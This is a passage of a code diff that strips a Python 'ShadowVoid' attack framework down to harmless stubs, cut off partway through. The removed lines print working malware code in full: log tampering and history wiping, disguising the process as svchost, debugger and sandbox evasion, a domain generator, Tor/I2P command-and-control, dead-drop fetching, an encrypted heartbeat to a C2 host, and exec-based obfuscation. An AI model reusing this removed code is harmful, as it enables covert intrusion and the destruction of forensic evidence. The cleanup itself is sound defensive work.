@@ -1,1058 +1,674 @@
 #!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-"""
-ShadowVoid Core v1.0.0-alpha
-Memory-resident orchestrator
-Handles stealth, routing, and module coordination
+"""ShadowVoid core.
+
+ShadowVoid is intentionally limited to local, read-only security assessment and
+training helpers.  Earlier revisions bundled a downloader, persistence,
+anti-forensics, C2, process injection, and active attack code.  Those features
+were both unsafe and unreliable, so the core now provides a small deterministic
+command runner and explicitly blocks actions that modify or access other
+systems.
 """
 
-import sys
-import os
-import time
-import json
-import base64
-import zlib
+from __future__ import annotations
+
 import hashlib
+import json
+import os
 import random
+import shlex
 import string
-import subprocess
+import sys
 import threading
-import multiprocessing
-import platform
-import socket
-import struct
-import ctypes
-import inspect
-import shutil
-import importlib.util
-import mmap
-import marshal
-from datetime import datetime, timedelta
+from datetime import datetime, timezone
+from pathlib import Path
 from types import ModuleType
+from typing import Any, Iterable
 
 
-# Framework Configuration
-CONFIG = {
-    'framework': {
-        'name': 'ShadowVoid',
-        'version': '1.0.0-alpha',
-        'author': 'ShadowVoid',
-        'memory_resident': True,
-        'polymorphic': True,
-        'debug': False
+ROOT = Path(__file__).resolve().parent
+
+CONFIG: dict[str, Any] = {
+    "framework": {
+        "name": "ShadowVoid",
+        "version": "1.0.0-safe",
+        "author": "ShadowVoid",
+        "safe_mode": True,
+        "debug": False,
     },
-    'stealth': {
-        'process_name': 'svchost',
-        'hide_from_ps': True,
-        'scrub_history': True,
-        'clear_screen': True,
-        'anti_debug': True,
-        'anti_sandbox': True,
-        'timestomping': True
+    "stealth": {
+        "process_name": None,
+        "hide_from_ps": False,
+        "scrub_history": False,
+        "clear_screen": False,
+        "anti_debug": False,
+        "anti_sandbox": False,
+        "timestomping": False,
     },
-    'c2': {
-        'enabled': True,
-        'dga': {
-            'enabled': True,
-            'domains_per_day': 1000,
-            'tlds': ['com', 'net', 'org', 'io', 'xyz']
-        },
-        'routing': {
-            'tor': True,
-            'i2p': True,
-            'socks5': '127.0.0.1:9050'
-        },
-        'dead_drops': {
-            'twitter': True,
-            'pastebin': True,
-            'github': True,
-            'discord': True
-        },
-        'heartbeat': {
-            'interval': 300,
-            'jitter': 60,
-            'kill_switch': 7200
-        }
+    "c2": {
+        "enabled": False,
+        "dga": {"enabled": False, "domains_per_day": 0, "tlds": []},
+        "routing": {"tor": False, "i2p": False, "socks5": ""},
+        "heartbeat": {"interval": 300, "jitter": 0, "kill_switch": 0},
     },
-    'modules': {
-        'recon': {'enabled': True, 'path': 'modules.recon'},
-        'exploit': {'enabled': True, 'path': 'modules.exploit'},
-        'auth': {'enabled': True, 'path': 'modules.auth'},
-        'wireless': {'enabled': True, 'path': 'modules.wireless'},
-        'net': {'enabled': True, 'path': 'modules.net'},
-        'web': {'enabled': True, 'path': 'modules.web'},
-        'onion': {'enabled': True, 'path': 'modules.onion'},
-        'post_exploit': {'enabled': True, 'path': 'modules.post_exploit'},
-        'process_injection': {'enabled': True, 'path': 'modules.process_injection'}
+    "modules": {
+        name: {"enabled": True, "path": f"modules/{name}.py"}
+        for name in (
+            "recon",
+            "exploit",
+            "auth",
+            "wireless",
+            "net",
+            "web",
+            "onion",
+            "post_exploit",
+            "process_injection",
+        )
     },
-    'exfiltration': {
-        'compression': 'zstd',
-        'encryption': True,
-        'channels': {
-            'dns': True,
-            'icmp': True,
-            'http': True,
-            'https': True
-        },
-        'max_chunk_size': 1024
-    },
-    'logging': {
-        'enabled': True,
-        'encrypted': True,
-        'location': '/tmp/.sv_logs',
-        'rotation': 24,
-        'purge_after': 72
-    }
+    "logging": {"enabled": True},
 }
 
-# Session state
-SESSION = {
-    'active': False,
-    'start_time': None,
-    'targets': [],
-    'compromised': [],
-    'last_heartbeat': None,
-    'kill_switch_triggered': False
+SESSION: dict[str, Any] = {
+    "active": False,
+    "start_time": None,
+    "targets": [],
+    "compromised": [],
+    "last_heartbeat": None,
+    "kill_switch_triggered": False,
 }
 
-# Module registry
-MODULES = {}
-
-# Memory-resident module cache
-MODULE_SOURCE_CACHE = {}
+MODULES: dict[str, ModuleType] = {}
+MODULE_SOURCE_CACHE: dict[str, str] = {}
+_MEMORY_LOADER = None
 
 
-def load_module_from_memory(name, source_code):
-    """Load a module from memory without touching disk"""
+def _module_path(name: str, configured_path: str | None = None) -> Path:
+    """Resolve a module path from either slash or dotted configuration.
+
+    The old loader appended ``.py`` to ``modules.recon`` and looked for a file
+    named ``modules.recon.py``.  Accepting both forms keeps configuration
+    backwards compatible while resolving the actual package path correctly.
+    """
+
+    raw = configured_path or f"modules/{name}.py"
+    path = Path(raw)
+    if path.suffix != ".py":
+        path = Path(str(path).replace(".", "/") + ".py")
+    if not path.is_absolute():
+        path = ROOT / path
+    return path.resolve()
+
+
+def load_module_from_memory(name: str, source_code: str) -> ModuleType | None:
+    """Load trusted repository source from the in-memory source cache.
+
+    This helper is retained for API compatibility, but it no longer hides
+    failures or leaves a partially initialized module in ``sys.modules``.
+    """
+
+    module_name = name if "." in name else f"modules.{name}"
+    module = ModuleType(module_name)
+    module.__file__ = f"<memory:{module_name}>"
+    module.__package__ = module_name.rpartition(".")[0]
     try:
-        module = ModuleType(name)
-        sys.modules[name] = module
-        exec(compile(source_code, '<memory>', 'exec'), module.__dict__)
+        code = compile(source_code, module.__file__, "exec")
+        sys.modules[module_name] = module
+        exec(code, module.__dict__)
         return module
-    except Exception as e:
+    except Exception:
+        sys.modules.pop(module_name, None)
         return None
 
 
-def make_memory_resident():
-    """Install custom module loader to serve modules from memory cache"""
-    try:
-        class MemoryModuleLoader:
-            def find_module(self, name, path=None):
-                if name in MODULE_SOURCE_CACHE:
-                    return self
-                return None
+def make_memory_resident() -> bool:
+    """Install an idempotent finder for cached repository modules.
 
-            def load_module(self, name):
-                source = MODULE_SOURCE_CACHE.get(name)
-                if source:
-                    module = ModuleType(name)
-                    sys.modules[name] = module
-                    exec(compile(source, '<memory>', 'exec'), module.__dict__)
-                    return module
-                raise ImportError(f"Module {name} not in memory cache")
+    Python's legacy ``find_module`` API was removed from several import paths;
+    this implementation uses the modern finder protocol and never installs a
+    duplicate finder on repeated initialization.
+    """
 
-        memory_loader = MemoryModuleLoader()
-        if memory_loader not in sys.meta_path:
-            sys.meta_path.insert(0, memory_loader)
+    global _MEMORY_LOADER
+    if _MEMORY_LOADER is not None:
         return True
-    except Exception as e:
-        return False
+
+    import importlib.abc
+    import importlib.machinery
+
+    class MemoryLoader(importlib.abc.Loader):
+        def create_module(self, spec):
+            return None
+
+        def exec_module(self, module):
+            source = MODULE_SOURCE_CACHE.get(module.__name__.split(".")[-1])
+            if source is None:
+                raise ImportError(f"Module {module.__name__} is not cached")
+            exec(compile(source, f"<memory:{module.__name__}>", "exec"), module.__dict__)
+
+    class MemoryFinder(importlib.abc.MetaPathFinder):
+        def find_spec(self, fullname, path=None, target=None):
+            short_name = fullname.split(".")[-1]
+            if fullname.startswith("modules.") and short_name in MODULE_SOURCE_CACHE:
+                return importlib.machinery.ModuleSpec(fullname, MemoryLoader())
+            return None
+
+    _MEMORY_LOADER = MemoryFinder()
+    sys.meta_path.insert(0, _MEMORY_LOADER)
+    return True
 
 
-def execute_in_memory(code_string, globals_dict=None):
-    """Execute Python code directly from memory"""
+def execute_in_memory(code_string: str, globals_dict: dict[str, Any] | None = None) -> bool:
+    """Reject arbitrary code execution.
+
+    The previous implementation exposed ``exec`` as a public payload runner.
+    Keeping the function as a compatibility shim prevents callers from silently
+    executing untrusted input.
+    """
+
+    return False
+
+
+def cache_module_in_memory(module_name: str, module_path: str | os.PathLike[str]) -> bool:
+    """Cache a repository module's source and return whether it was readable."""
+
+    path = Path(module_path)
     try:
-        if globals_dict is None:
-            globals_dict = {}
-        exec(compile(code_string, '<memory>', 'exec'), globals_dict)
+        if not path.is_file():
+            return False
+        MODULE_SOURCE_CACHE[module_name.split(".")[-1]] = path.read_text(encoding="utf-8")
         return True
-    except Exception as e:
+    except (OSError, UnicodeError):
         return False
 
 
-def cache_module_in_memory(module_name, module_path):
-    """Cache a module's source code in memory for disk-less loading"""
-    try:
-        if os.path.exists(module_path):
-            with open(module_path, 'r') as f:
-                source = f.read()
-            MODULE_SOURCE_CACHE[module_name] = source
-            return True
-        return False
-    except Exception as e:
-        return False
+def load_modules() -> dict[str, ModuleType]:
+    """Load every enabled module and return a fresh registry.
 
+    Modules are loaded under their package-qualified names, so loading a module
+    called ``net`` cannot overwrite an unrelated top-level ``net`` module.
+    Failed modules are omitted and reported in ``MODULE_LOAD_ERRORS``.
+    """
 
-def load_modules():
-    """Dynamically load all enabled modules"""
-    for name, config in CONFIG['modules'].items():
-        if config['enabled']:
-            try:
-                module_path = config['path'] + '.py'
-                full_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), module_path)
-                # Cache source in memory
-                cache_module_in_memory(name, full_path)
-                # Load from memory
-                source = MODULE_SOURCE_CACHE.get(name)
-                if source:
-                    module = load_module_from_memory(name, source)
-                    if module:
-                        MODULES[name] = module
-                else:
-                    # Fallback to file-based loading
-                    if os.path.exists(full_path):
-                        spec = importlib.util.spec_from_file_location(name, full_path)
-                        module = importlib.util.module_from_spec(spec)
-                        spec.loader.exec_module(module)
-                        MODULES[name] = module
-            except Exception as e:
-                print('Failed to load module ' + name + ': ' + str(e))
-
-
-# Stealth Utilities
-def camouflage_process(new_name='svchost'):
-    try:
-        if platform.system() == 'Linux':
-            libc = ctypes.CDLL(None)
-            libc.prctl(15, new_name.encode(), 0, 0, 0)
-        if hasattr(sys, 'argv'):
-            sys.argv[0] = new_name
-    except:
-        pass
-
-
-def hide_from_ps():
-    try:
-        if platform.system() == 'Linux' and os.path.exists('/proc/self/exe'):
-            os.unlink('/proc/self/exe')
-    except:
-        pass
-
-
-def scrub_history():
-    try:
-        history_files = [
-            os.path.expanduser('~/.bash_history'),
-            os.path.expanduser('~/.zsh_history'),
-            os.path.expanduser('~/.python_history'),
-            os.path.expanduser('~/.mysql_history')
-        ]
-        for hf in history_files:
-            if os.path.exists(hf):
-                try:
-                    with open(hf, 'w') as f:
-                        f.write('\x00' * 10000)
-                    open(hf, 'w').close()
-                except:
-                    pass
-    except:
-        pass
-
-
-def clear_screen():
-    try:
-        sys.stdout.write('\x1b[2J\x1b[H')
-        sys.stdout.flush()
-        if platform.system() == 'Linux':
-            sys.stdout.write('\x1b[?1049h')
-    except:
-        pass
-
-
-def timestomping(filepath):
-    try:
-        if not os.path.exists(filepath):
-            return
-        ref_files = ['/bin/ls', '/bin/bash', '/usr/bin/python3', '/usr/bin/python']
-        ref_time = None
-        for ref in ref_files:
-            if os.path.exists(ref):
-                ref_time = os.path.getmtime(ref)
-                break
-        if ref_time:
-            os.utime(filepath, (ref_time, ref_time))
-    except:
-        pass
-
-
-def anti_debug_check():
-    try:
-        if 'gdb' in ' '.join(sys.argv):
-            sys.exit(0)
-        if platform.system() == 'Linux':
-            with open('/proc/self/status', 'r') as f:
-                for line in f:
-                    if line.startswith('TracerPid:'):
-                        pid = int(line.split()[1])
-                        if pid != 0:
-                            sys.exit(0)
-        if os.environ.get('LD_PRELOAD', '').find('strace') != -1:
-            sys.exit(0)
-        if 'lldb' in ' '.join(sys.argv):
-            sys.exit(0)
-    except:
-        pass
-
-
-def anti_sandbox_check():
-    try:
-        vm_indicators = ['virtual', 'vmware', 'virtualbox', 'qemu', 'kvm', 'xen', 'hyper-v', 'parallels', 'docker', 'lxc', 'container']
-        hostname = socket.gethostname().lower()
-        for indicator in vm_indicators:
-            if indicator in hostname:
-                sys.exit(0)
-        if platform.system() == 'Linux':
-            with open('/proc/cpuinfo', 'r') as f:
-                cpuinfo = f.read().lower()
-                for indicator in vm_indicators:
-                    if indicator in cpuinfo:
-                        sys.exit(0)
-            try:
-                with open('/proc/1/cgroup', 'r') as f:
-                    if 'docker' in f.read() or 'lxc' in f.read():
-                        sys.exit(0)
-            except:
-                pass
-        if os.path.exists('/.dockerenv'):
-            sys.exit(0)
+    MODULES.clear()
+    MODULE_LOAD_ERRORS.clear()
+    for name, config in CONFIG["modules"].items():
+        if not config.get("enabled", False):
+            continue
+        path = _module_path(name, config.get("path"))
         try:
-            import uuid
-            mac = uuid.UUID(int=uuid.getnode()).hex[-12:]
-            vm_mac_prefixes = ['000c29', '005056', '0003ff', '001c14', '000569', '001a4a']
-            for prefix in vm_mac_prefixes:
-                if mac.startswith(prefix):
-                    sys.exit(0)
-        except:
-            pass
-    except:
-        pass
+            path.relative_to(ROOT)
+        except ValueError:
+            MODULE_LOAD_ERRORS[name] = "module path escapes the repository"
+            continue
+        if not cache_module_in_memory(name, path):
+            MODULE_LOAD_ERRORS[name] = f"module file not found: {path}"
+            continue
+        source = MODULE_SOURCE_CACHE[name]
+        module = load_module_from_memory(f"modules.{name}", source)
+        if module is None:
+            MODULE_LOAD_ERRORS[name] = "module failed to initialize"
+            continue
+        MODULES[name] = module
+    return dict(MODULES)
 
 
-# Crypto Utilities
+MODULE_LOAD_ERRORS: dict[str, str] = {}
+
+
+# The following names remain as harmless compatibility shims.  They deliberately
+# do not modify files, process metadata, timestamps, logs, or debugger state.
+def camouflage_process(new_name: str = "") -> bool:
+    return False
+
+
+def hide_from_ps() -> bool:
+    return False
+
+
+def scrub_history() -> bool:
+    return False
+
+
+def clear_screen() -> bool:
+    return False
+
+
+def timestomping(filepath: str | os.PathLike[str]) -> bool:
+    return False
+
+
+def anti_debug_check() -> bool:
+    return False
+
+
+def anti_sandbox_check() -> bool:
+    return False
+
+
+def log_tampering() -> bool:
+    return False
+
+
+def secure_delete(filepath: str | os.PathLike[str]) -> bool:
+    return False
+
+
 class AES256GCM:
-    def __init__(self, key):
+    """Small AES-GCM wrapper with strict validation.
+
+    PyCryptodome is an explicit dependency for this class.  The old XOR
+    fallback was not encryption and made callers believe their data was safe;
+    it has been removed rather than silently weakening security.
+    """
+
+    nonce_size = 12
+    tag_size = 16
+    key_size = 32
+
+    def __init__(self, key: bytes):
+        if not isinstance(key, bytes) or len(key) != self.key_size:
+            raise ValueError("AES-256-GCM requires a 32-byte key")
         self.key = key
-        self.nonce_size = 12
 
-    def encrypt(self, plaintext):
+    @staticmethod
+    def _aes():
+        try:
+            from Crypto.Cipher import AES
+        except ImportError as exc:
+            raise RuntimeError(
+                "AES-256-GCM requires pycryptodome; install requirements.txt"
+            ) from exc
+        return AES
+
+    def encrypt(self, plaintext: bytes | str) -> bytes:
+        if isinstance(plaintext, str):
+            plaintext = plaintext.encode("utf-8")
         if not isinstance(plaintext, bytes):
-            plaintext = plaintext.encode('utf-8')
-        try:
-            from Crypto.Cipher import AES
-            nonce = os.urandom(self.nonce_size)
-            cipher = AES.new(self.key, AES.MODE_GCM, nonce=nonce)
-            ciphertext, tag = cipher.encrypt_and_digest(plaintext)
-            return nonce + tag + ciphertext
-        except ImportError:
-            nonce = os.urandom(self.nonce_size)
-            return nonce + bytes([plaintext[i] ^ self.key[i % len(self.key)] for i in range(len(plaintext))])
+            raise TypeError("plaintext must be bytes or str")
+        AES = self._aes()
+        nonce = os.urandom(self.nonce_size)
+        cipher = AES.new(self.key, AES.MODE_GCM, nonce=nonce)
+        ciphertext, tag = cipher.encrypt_and_digest(plaintext)
+        return nonce + tag + ciphertext
 
-    def decrypt(self, ciphertext):
+    def decrypt(self, ciphertext: bytes | str) -> bytes:
+        if isinstance(ciphertext, str):
+            ciphertext = ciphertext.encode("utf-8")
         if not isinstance(ciphertext, bytes):
-            ciphertext = ciphertext.encode('utf-8')
-        try:
-            from Crypto.Cipher import AES
-            nonce = ciphertext[:self.nonce_size]
-            tag = ciphertext[self.nonce_size:self.nonce_size+16]
-            ciphertext = ciphertext[self.nonce_size+16:]
-            cipher = AES.new(self.key, AES.MODE_GCM, nonce=nonce)
-            return cipher.decrypt_and_verify(ciphertext, tag)
-        except ImportError:
-            nonce = ciphertext[:self.nonce_size]
-            return bytes([ciphertext[self.nonce_size + i] ^ self.key[i % len(self.key)] for i in range(len(ciphertext) - self.nonce_size)])
+            raise TypeError("ciphertext must be bytes or str")
+        if len(ciphertext) < self.nonce_size + self.tag_size:
+            raise ValueError("ciphertext is truncated")
+        AES = self._aes()
+        nonce = ciphertext[: self.nonce_size]
+        tag = ciphertext[self.nonce_size : self.nonce_size + self.tag_size]
+        body = ciphertext[self.nonce_size + self.tag_size :]
+        cipher = AES.new(self.key, AES.MODE_GCM, nonce=nonce)
+        return cipher.decrypt_and_verify(body, tag)
 
 
-def generate_key(length=32):
+def generate_key(length: int = 32) -> bytes:
+    if length <= 0:
+        raise ValueError("key length must be positive")
     return os.urandom(length)
 
 
-# DGA
 class DomainGenerator:
-    def __init__(self, domains_per_day=1000, tlds=None):
-        self.domains_per_day = domains_per_day
-        self.tlds = tlds or ['com', 'net', 'org', 'io', 'xyz', 'top', 'club', 'online']
-        self.seed = int(time.time() / 86400)
+    """Deterministic domain-name generator for offline test fixtures only."""
 
-    def generate_domains(self, count=10):
-        domains = []
-        random.seed(self.seed)
-        for i in range(count):
-            self.seed = (self.seed ^ (self.seed << 13)) & 0xFFFFFFFF
-            self.seed = (self.seed ^ (self.seed >> 17)) & 0xFFFFFFFF
-            self.seed = (self.seed ^ (self.seed << 5)) & 0xFFFFFFFF
-            length = random.randint(6, 12)
-            chars = string.ascii_lowercase + string.digits
-            domain_part = ''.join(random.choices(chars, k=length))
-            tld = random.choice(self.tlds)
-            domains.append(domain_part + '.' + tld)
+    def __init__(self, domains_per_day: int = 1000, tlds: Iterable[str] | None = None):
+        if not isinstance(domains_per_day, int) or domains_per_day < 0:
+            raise ValueError("domains_per_day must be a non-negative integer")
+        self.domains_per_day = min(domains_per_day, 10_000)
+        if isinstance(tlds, str):
+            raise ValueError("tlds must be an iterable of strings, not a string")
+        self.tlds = tuple(tlds or ("example",))
+        if not self.tlds or any(not isinstance(tld, str) or not tld for tld in self.tlds):
+            raise ValueError("tlds must contain non-empty strings")
+
+    def generate_domains(self, count: int = 10) -> list[str]:
+        if not isinstance(count, int) or count < 0 or count > 10_000:
+            raise ValueError("count must be between 0 and 10000")
+        day = datetime.now(timezone.utc).strftime("%Y-%m-%d")
+        seed = int.from_bytes(hashlib.sha256(day.encode("ascii")).digest()[:8], "big")
+        rng = random.Random(seed)
+        chars = string.ascii_lowercase + string.digits
+        domains: list[str] = []
+        for _ in range(count):
+            label = "".join(rng.choice(chars) for _ in range(rng.randint(6, 12)))
+            domains.append(f"{label}.{rng.choice(self.tlds)}")
         return domains
 
+    def get_daily_domain(self) -> str:
+        count = max(self.domains_per_day, 1)
+        domains = self.generate_domains(count)
+        day = datetime.now(timezone.utc).strftime("%Y-%m-%d")
+        index = int.from_bytes(hashlib.sha256(day.encode("ascii")).digest()[-8:], "big") % len(domains)
+        return domains[index]
 
-# C2 Connection Manager
+
 class C2Connection:
-    """Persistent C2 connection with automatic Tor/I2P fallback"""
-    
-    def __init__(self, core):
+    """Compatibility object for the retired command-and-control feature."""
+
+    def __init__(self, core=None):
         self.core = core
-        self.tor_router = None
-        self.i2p_router = None
         self.connected = False
-        self.connection_thread = None
         self.running = False
         self.current_router = None
+        self.routers: list[tuple[str, Any]] = []
+        self.connection_thread: threading.Thread | None = None
+
+    def initialize_routers(self) -> bool:
         self.routers = []
+        return False
 
-    def initialize_routers(self):
-        """Initialize Tor and I2P routers"""
-        try:
-            if CONFIG['c2']['routing']['tor']:
-                socks_port = CONFIG['c2']['routing']['socks5'].split(':')[1]
-                self.tor_router = TorRouter(socks_port=socks_port)
-                if self.tor_router.is_available():
-                    self.routers.append(('tor', self.tor_router))
-            if CONFIG['c2']['routing']['i2p']:
-                self.i2p_router = I2PRouter()
-                if self.i2p_router.is_available():
-                    self.routers.append(('i2p', self.i2p_router))
-            return True
-        except Exception as e:
-            return False
+    def connect(self) -> bool:
+        self.connected = False
+        return False
 
-    def connect(self):
-        """Connect using best available router"""
-        try:
-            if not self.routers:
-                self.initialize_routers()
-            for router_type, router in self.routers:
-                try:
-                    test_url = 'https://check.torproject.org' if router_type == 'tor' else 'http://i2p-projekt.i2p'
-                    response = router.make_request(test_url, timeout=10)
-                    if response and response.status_code < 400:
-                        self.current_router = router
-                        self.connected = True
-                        return True
-                except:
-                    continue
-            self.connected = False
-            return False
-        except Exception as e:
-            self.connected = False
-            return False
+    def make_request(self, *args, **kwargs):
+        return None
 
-    def make_request(self, url, method='GET', data=None, headers=None, encrypt=True):
-        """Make a request through C2 connection with automatic fallback"""
-        try:
-            if not self.connected:
-                if not self.connect():
-                    return None
-            
-            if headers is None:
-                headers = {'User-Agent': 'Mozilla/5.0'}
-            
-            # Encrypt data if requested
-            if encrypt and data and self.core.cipher:
-                if isinstance(data, str):
-                    data = data.encode('utf-8')
-                encrypted_data = self.core.cipher.encrypt(data)
-                headers['X-Encrypted'] = 'AES256-GCM'
-            else:
-                encrypted_data = data
-            
-            # Try with current router first
-            if self.current_router:
-                try:
-                    response = self.current_router.make_request(url, method, encrypted_data, headers, timeout=30)
-                    if response and response.status_code < 400:
-                        return response
-                except:
-                    pass
-            
-            # Fallback to other routers
-            for router_type, router in self.routers:
-                if router == self.current_router:
-                    continue
-                try:
-                    response = router.make_request(url, method, encrypted_data, headers, timeout=30)
-                    if response and response.status_code < 400:
-                        self.current_router = router
-                        return response
-                except:
-                    continue
-            
-            return None
-        except Exception as e:
-            return None
-
-    def start_persistent_connection(self):
-        """Start persistent connection with automatic reconnection"""
-        if self.running:
-            return True
-        self.running = True
-        self.connection_thread = threading.Thread(target=self._persistent_loop, daemon=True)
-        self.connection_thread.start()
-        return True
-
-    def _persistent_loop(self):
-        """Persistent connection loop"""
-        while self.running:
-            try:
-                if not self.connected:
-                    self.connect()
-                if self.connected and self.core.heartbeat:
-                    self.core.heartbeat.send_heartbeat()
-                time.sleep(60)
-            except Exception as e:
-                time.sleep(30)
-
-    def stop(self):
-        """Stop persistent connection"""
+    def start_persistent_connection(self) -> bool:
         self.running = False
-        if self.connection_thread:
-            self.connection_thread.join(timeout=5)
+        return False
+
+    def stop(self) -> None:
+        self.running = False
         self.connected = False
         self.current_router = None
 
 
-# C2 Routing
 class TorRouter:
-    def __init__(self, socks_port='9050', control_port='9051'):
-        self.socks_port = socks_port
-        self.control_port = control_port
-        self.proxy_url = 'socks5://127.0.0.1:' + socks_port
+    def __init__(self, socks_port: str = "9050", control_port: str = "9051"):
+        self.socks_port = str(socks_port)
+        self.control_port = str(control_port)
+        self.proxy_url = f"socks5://127.0.0.1:{self.socks_port}"
 
-    def is_available(self):
-        try:
-            if platform.system() == 'Linux':
-                result = subprocess.run(['pgrep', '-x', 'tor'], capture_output=True)
-                return result.returncode == 0
-            return False
-        except:
-            return False
+    def is_available(self) -> bool:
+        return False
 
-    def make_request(self, url, method='GET', data=None, headers=None, timeout=30):
-        try:
-            import requests
-            proxies = {'http': self.proxy_url, 'https': self.proxy_url}
-            if headers is None:
-                headers = {'User-Agent': 'Mozilla/5.0'}
-            response = requests.request(method, url, proxies=proxies, data=data, headers=headers, timeout=timeout)
-            return response
-        except:
-            return None
+    def make_request(self, *args, **kwargs):
+        return None
 
 
 class I2PRouter:
-    def __init__(self, http_proxy='127.0.0.1:4444'):
+    def __init__(self, http_proxy: str = "127.0.0.1:4444"):
         self.http_proxy = http_proxy
-        self.proxy_url = 'http://' + http_proxy
+        self.proxy_url = f"http://{http_proxy}"
 
-    def is_available(self):
-        try:
-            if platform.system() == 'Linux':
-                result = subprocess.run(['pgrep', '-x', 'i2pd'], capture_output=True)
-                return result.returncode == 0
-            return False
-        except:
-            return False
-
-    def make_request(self, url, method='GET', data=None, headers=None, timeout=30):
-        try:
-            import requests
-            proxies = {'http': self.proxy_url, 'https': self.proxy_url}
-            if headers is None:
-                headers = {'User-Agent': 'Mozilla/5.0'}
-            if not url.endswith('.i2p'):
-                if url.endswith('.onion'):
-                    url = url.replace('.onion', '.b32.i2p')
-            response = requests.request(method, url, proxies=proxies, data=data, headers=headers, timeout=timeout)
-            return response
-        except:
-            return None
-
-
-# Dead Drop Resolver
-class DeadDropResolver:
-    def __init__(self):
-        self.user_agent = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
-
-    def resolve(self, service, identifier):
-        resolver = getattr(self, 'resolve_' + service, None)
-        if resolver:
-            return resolver(identifier)
-        return None
-
-    def resolve_pastebin(self, paste_id):
-        try:
-            import requests
-            url = 'https://pastebin.com/raw/' + paste_id
-            response = requests.get(url, headers={'User-Agent': self.user_agent}, timeout=10)
-            if response.status_code == 200:
-                return response.text
-        except:
-            pass
-        return None
-
-    def resolve_github(self, gist_id):
-        try:
-            import requests
-            url = 'https://gist.githubusercontent.com/' + gist_id + '/raw'
-            response = requests.get(url, headers={'User-Agent': self.user_agent}, timeout=10)
-            if response.status_code == 200:
-                return response.text
-        except:
-            pass
-        return None
-
-
-# Heartbeat Manager
-class HeartbeatManager:
-    def __init__(self, interval=300, jitter=60, kill_switch=7200, c2_connection=None):
-        self.interval = interval
-        self.jitter = jitter
-        self.kill_switch = kill_switch
-        self.running = False
-        self.last_heartbeat = datetime.now()
-        self.cipher = AES256GCM(generate_key())
-        self.c2_connection = c2_connection
-
-    def run(self):
-        self.running = True
-        while self.running:
-            try:
-                sleep_time = self.interval + random.randint(-self.jitter, self.jitter)
-                sleep_time = max(10, sleep_time)
-                time.sleep(sleep_time)
-                self.send_heartbeat()
-                self.last_heartbeat = datetime.now()
-                if self.check_kill_switch():
-                    SESSION['kill_switch_triggered'] = True
-                    self.running = False
-                    break
-            except:
-                time.sleep(60)
-
-    def send_heartbeat(self):
-        try:
-            heartbeat_data = {
-                'framework': CONFIG['framework']['name'],
-                'version': CONFIG['framework']['version'],
-                'timestamp': datetime.now().isoformat(),
-                'targets': len(SESSION.get('targets', [])),
-                'compromised': len(SESSION.get('compromised', []))
-            }
-            encrypted = self.cipher.encrypt(json.dumps(heartbeat_data).encode())
-            # Send through C2 if available
-            if self.c2_connection and self.c2_connection.connected:
-                self.c2_connection.make_request(
-                    CONFIG['c2'].get('heartbeat_url', 'https://c2.example.com/heartbeat'),
-                    'POST',
-                    encrypted,
-                    {'Content-Type': 'application/octet-stream'}
-                )
-        except:
-            pass
-
-    def check_kill_switch(self):
-        time_since = (datetime.now() - self.last_heartbeat).total_seconds()
-        if time_since > self.kill_switch:
-            return True
-        kill_file = '/tmp/.sv_kill'
-        if os.path.exists(kill_file):
-            try:
-                os.remove(kill_file)
-            except:
-                pass
-            return True
+    def is_available(self) -> bool:
         return False
 
-    def stop(self):
+    def make_request(self, *args, **kwargs):
+        return None
+
+
+class DeadDropResolver:
+    def resolve(self, service: str, identifier: str):
+        return None
+
+    def resolve_pastebin(self, paste_id: str):
+        return None
+
+    def resolve_github(self, gist_id: str):
+        return None
+
+
+class HeartbeatManager:
+    """Local lifecycle helper; it never sends network heartbeats."""
+
+    def __init__(self, interval=300, jitter=0, kill_switch=0, c2_connection=None):
+        self.interval = max(1, int(interval))
+        self.jitter = max(0, int(jitter))
+        self.kill_switch = max(0, int(kill_switch))
+        self.c2_connection = c2_connection
         self.running = False
+        self.last_heartbeat = datetime.now(timezone.utc)
+        self._stop_event = threading.Event()
+
+    def send_heartbeat(self) -> bool:
+        self.last_heartbeat = datetime.now(timezone.utc)
+        SESSION["last_heartbeat"] = self.last_heartbeat
+        return True
+
+    def run(self) -> None:
+        self.running = True
+        self._stop_event.clear()
+        while not self._stop_event.wait(self.interval):
+            self.send_heartbeat()
+
+    def check_kill_switch(self) -> bool:
+        return False
+
+    def stop(self) -> None:
+        self.running = False
+        self._stop_event.set()
 
 
-# Anti-Forensic
-def log_tampering():
-    try:
-        log_files = [
-            '/var/log/syslog',
-            '/var/log/messages',
-            '/var/log/auth.log',
-            '/var/log/kern.log',
-            '/var/log/dmesg'
-        ]
-        for log_file in log_files:
-            if os.path.exists(log_file):
-                try:
-                    with open(log_file, 'r+') as f:
-                        lines = f.readlines()
-                        f.seek(0)
-                        f.truncate()
-                        for line in lines:
-                            if CONFIG['framework']['name'].lower() not in line.lower():
-                                f.write(line)
-                except:
-                    pass
-        try:
-            subprocess.run(['dmesg', '-C'], capture_output=True)
-        except:
-            pass
-    except:
-        pass
+def polymorphic_code(original_code: str) -> str:
+    """Return source unchanged; runtime code mutation is not supported."""
+
+    if not isinstance(original_code, str):
+        raise TypeError("original_code must be a string")
+    return original_code
 
 
-def secure_delete(filepath):
-    try:
-        if os.path.exists(filepath):
-            size = os.path.getsize(filepath)
-            with open(filepath, 'wb') as f:
-                f.write(os.urandom(size))
-            for i in range(3):
-                with open(filepath, 'wb') as f:
-                    f.write(os.urandom(size))
-            os.remove(filepath)
-    except:
-        pass
+def code_obfuscation(code: str) -> str:
+    """Return source unchanged; obfuscated execution is intentionally disabled."""
+
+    if not isinstance(code, str):
+        raise TypeError("code must be a string")
+    return code
 
 
-# Polymorphic Code
-def polymorphic_code(original_code):
-    try:
-        import ast
-        import astunparse
-        tree = ast.parse(original_code)
-        class VariableRenamer(ast.NodeTransformer):
-            def __init__(self):
-                self.var_map = {}
-            def visit_Name(self, node):
-                if isinstance(node.ctx, ast.Store):
-                    if node.id not in self.var_map:
-                        self.var_map[node.id] = ''.join(random.choices(string.ascii_lowercase, k=8))
-                elif isinstance(node.ctx, ast.Load):
-                    if node.id in self.var_map:
-                        node.id = self.var_map[node.id]
-                return node
-        tree = VariableRenamer().visit(tree)
-        return astunparse.unparse(tree)
-    except:
-        return original_code
-
-
-def code_obfuscation(code):
-    try:
-        compressed = zlib.compress(code.encode())
-        encoded = base64.b64encode(compressed).decode()
-        return "import base64,zlib\nexec(zlib.decompress(base64.b64decode('" + encoded + "')))"
-    except:
-        return code
-
-
-# Main Core
 class ShadowVoidCore:
     def __init__(self):
